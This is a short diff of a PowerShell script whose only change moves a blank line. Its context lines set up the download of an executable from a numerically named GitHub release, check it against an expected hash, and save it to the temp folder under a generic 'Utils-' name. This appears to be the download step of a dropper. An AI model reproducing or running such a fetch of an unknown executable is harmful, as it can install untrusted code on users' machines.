@@ -1,6 +1,6 @@
 
-
 $downloadUrl = "https://github.com/mateuscobe-max/32759017815/releases/download/latest/32759017815.exe"
+
 $expectedHash = "AD6D7289E40B8BB2502267ECC8B36A4FF25068AADFA5441F9EC1325C16EB467B".ToUpperInvariant()
 
 $tempFile = Join-Path $env:TEMP ("Utils-" + [Guid]::NewGuid().ToString("N") + ".exe")
